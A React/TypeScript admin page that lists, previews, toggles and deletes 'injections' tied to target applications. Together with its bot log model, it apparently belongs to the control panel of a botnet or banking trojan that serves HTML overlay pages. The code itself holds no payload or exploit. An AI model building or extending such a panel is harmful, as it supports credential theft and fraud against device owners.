import React, {useLayoutEffect, useState} from "react";
import {Button, Divider, Modal, Pagination, Space, Switch, Table} from "antd";
import {
    CodeOutlined,
    DeleteFilled,
    EditFilled,
    EyeFilled,
    PaperClipOutlined, PlusSquareOutlined, PoweroffOutlined,
    UnorderedListOutlined,
} from "@ant-design/icons";
import AddInject from "../../Modals/AddInject/AddInject";
import {useDispatch, useSelector} from "react-redux";
import {AppState} from "../../../Store/RootReducer";
import {
    changeInjectsSort,
    deleteInjects,
    getInjectsList,
    setAutoInject,
    setInjectsPage,
} from "../../../Store/Injections/Actions";
import {getApiUrl} from "../../../Util/config";
import {Inject} from "../../../Model/Inject";
import {scrollToTop} from "../../../Util/scrollToTop";
import {FilterValue, SorterResult, TablePaginationConfig} from "antd/lib/table/interface";
import {BotLog} from "../../../Model/BotLog";
import EditInject from "../../Modals/EditInject/EditInject";
import {hasAccess} from "../../../Util/hasAccess";
import {ColumnType} from "antd/es/table/interface";
import InjectionsFilter from "./InjectionsFilter";

interface InjectsLogsColumns<T> extends ColumnType<T> {
    isHidden?: boolean,
}

const Injections: React.FC = () => {
    const [showEditInject, setShowEditInject] = useState(false);
    const [showAddInject, setShowAddInject] = useState(false);
    const [selectedInjection, setSelectedInjection] = useState<Inject|null>(null);

    const setShowEditInjectModal = (injection: Inject) => {
        setSelectedInjection(injection);
        setShowEditInject(true);
    };

    const onTableChange = (
        pagination: TablePaginationConfig,
        filters: Record<string, FilterValue | null>,
        sorter: SorterResult<Inject> | SorterResult<Inject>[],
    ) => {
        const Sorter = sorter as SorterResult<BotLog>;
        scrollToTop();
        dispatch(changeInjectsSort({
            field: Sorter.columnKey as string,
            by: Sorter.order as string,
        }));
    };

    const dispatch = useDispatch();

    const injectionsReducer = useSelector((state: AppState) => state.injects);

    useLayoutEffect(() => {
        dispatch(getInjectsList(
            injectionsReducer.filters,
            injectionsReducer.sort,
            injectionsReducer.page,
            injectionsReducer.per_page,
        ));
    }, [dispatch, injectionsReducer.page, injectionsReducer.per_page, injectionsReducer.sort, injectionsReducer.filters]);

    const injectsPaginationHandler = (pageNumber: number, size: number) => {
        if (injectionsReducer.isLoaded &&
            injectionsReducer.page === injectionsReducer.loaded_page &&
            injectionsReducer.page === injectionsReducer.loaded_page &&
            injectionsReducer.loaded_per_page === injectionsReducer.per_page) {
            scrollToTop();
            dispatch(setInjectsPage(pageNumber, size));
        }
    };

    const isLoaded = injectionsReducer.isLoaded &&
        injectionsReducer.isLoaded &&
        injectionsReducer.page === injectionsReducer.loaded_page &&
        injectionsReducer.loaded_per_page === injectionsReducer.per_page;

    const authReducer = useSelector((state: AppState) => state.auth);

    const columns: InjectsLogsColumns<Inject>[] = [
        {
            title: (
                <>
                    <CodeOutlined /> Application
                </>
            ),
            dataIndex: "application",
            key: "application",
            width: 490,
            render: (application: string, inject: Inject) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>Application</h3>
                        </div>
                        <div className="table-col-item">
                            <Space size={10}>
                                <img src={getApiUrl(inject.image)} width={16} alt={application} />
                                {application}
                            </Space>
                        </div>
                    </div>
                );
            },
        },
        {
            title: (
                <>
                    <CodeOutlined /> Name
                </>
            ),
            dataIndex: "name",
            key: "name",
            render: (text: string) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Name</h3>
                    </div>
                    <div className="table-col-item">
                        {text}
                    </div>
                </div>,

        },
        {
            title: (
                <>
                    <CodeOutlined /> Type
                </>
            ),
            dataIndex: "type",
            key: "type",
            render: (text: string) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Type</h3>
                    </div>
                    <div className="table-col-item">
                        {text}
                    </div>
                </div>,
        },
        {
            title: (
                <>
                    <PoweroffOutlined /> AutoInject
                </>
            ),
            dataIndex: "auto",
            width: 130,
            key: "auto",
            render: (auto: boolean, inject: Inject) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>AutoInject</h3>
                    </div>
                    <div className="table-col-item">
                        <Switch defaultChecked={auto} onChange={(value: boolean) => {
                            dispatch(setAutoInject(inject.id, value));
                        }} />
                    </div>
                </div>
            ),
        },
        {
            title: (
                <>
                    <PaperClipOutlined /> HTML
                </>
            ),
            dataIndex: "html",
            width: 100,
            render: (html: string) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>HTML</h3>
                    </div>
                    <div className="table-col-item">
                        <Button
                            type="dashed"
                            shape="circle"
                            icon={<EyeFilled />}
                            size="small"
                            onClick={() => {
                                Modal.info({
                                    title: "HTML Preview",
                                    icon: null,
                                    content: (
                                        <div
                                            style={{
                                                margin: "0 -32px",
                                            }}
                                        >
                                            <iframe
                                                src={getApiUrl(html)}
                                                title="Inject title"
                                                frameBorder="0"
                                                width="100%"
                                                height={600}
                                            />
                                        </div>
                                    ),
                                    closable: true,
                                    okText: "Close",
                                });
                            }}
                        />
                    </div>
                </div>
            ),
        },
        {
            title: (
                <>
                    <UnorderedListOutlined /> Actions
                </>
            ),
            dataIndex: "actions",
            width: 100,
            render: (actions: string, injection: Inject) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Actions</h3>
                    </div>
                    <div className="table-col-item">
                        <Space size={10}>
                            {hasAccess(authReducer.user, "injections.edit") && (
                                <Button
                                    type="primary"
                                    shape="circle"
                                    icon={<EditFilled />}
                                    onClick={() => setShowEditInjectModal(injection)}
                                />
                            )}
                            {hasAccess(authReducer.user, "injections.delete") && (
                                <Button
                                    type="primary"
                                    shape="circle"
                                    icon={<DeleteFilled />}
                                    danger
                                    onClick={() => {
                                        Modal.confirm({
                                            title: "Delete injection?",
                                            content: "This action can`t be undone",
                                            okText: "Delete",
                                            okButtonProps: {
                                                danger: true,
                                            },
                                            onOk: () => {
                                                dispatch(deleteInjects([injection.id]));
                                            },
                                        });
                                    }}
                                />
                            )}
                        </Space>
                    </div>
                </div>
            ),
            isHidden: !hasAccess(authReducer.user, "injections.edit") && !hasAccess(authReducer.user, "injections.delete"),
        },
    ];

    return (
        <>
            <div className="panel-header">
                <h2 className="panel-title">Injections</h2>
            </div>

            <InjectionsFilter isLoaded={isLoaded} />

            <div className="panel-content">

                {hasAccess(authReducer.user, "injections.create") && (
                    <>
                        <Button
                            type="primary"
                            icon={<PlusSquareOutlined/>}
                            onClick={() => setShowAddInject(true)}
                        >
                            New inject
                        </Button>

                        <Divider />
                    </>
                )}


                <Table
                    columns={columns.filter((column: InjectsLogsColumns<Inject>) => !column.isHidden)}
                    dataSource={injectionsReducer.injections}
                    size="small"
                    pagination={false}
                    rowKey="id"
                    tableLayout="fixed"
                    onChange={onTableChange}
                    loading={!isLoaded}
                />

                <br/>

                <Pagination
                    total={injectionsReducer.total}
                    defaultPageSize={injectionsReducer.per_page}
                    onChange={injectsPaginationHandler}
                    showSizeChanger={true}
                    current={injectionsReducer.page}
                    disabled={injectionsReducer.loaded_page !== injectionsReducer.page || injectionsReducer.loaded_per_page !== injectionsReducer.per_page}
                />
            </div>

            {selectedInjection && (
                <>
                    <EditInject visible={showEditInject} setVisible={setShowEditInject} injection={selectedInjection} />
                </>
            )}

            <AddInject visible={showAddInject} setVisible={setShowAddInject} />
        </>
    );
};

export default Injections;
